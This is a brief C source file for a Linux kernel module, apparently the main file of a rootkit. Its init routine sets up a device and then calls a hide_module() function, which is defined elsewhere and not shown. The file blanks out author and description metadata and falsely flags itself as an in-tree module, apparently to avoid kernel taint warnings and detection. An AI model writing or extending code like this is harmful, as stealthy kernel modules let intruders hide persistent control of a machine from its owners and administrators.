#include <linux/module.h>

#include "device.h"
#include "hide.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("");
MODULE_DESCRIPTION("");
MODULE_VERSION("");
MODULE_INFO(intree, "Y");

static int __init mod_init(void) {
    int err = init_device();
    if (err) {
        return err;
    }

    return hide_module();
}

static void __exit mod_exit(void) {
    rm_device();
}

module_init(mod_init);
module_exit(mod_exit);
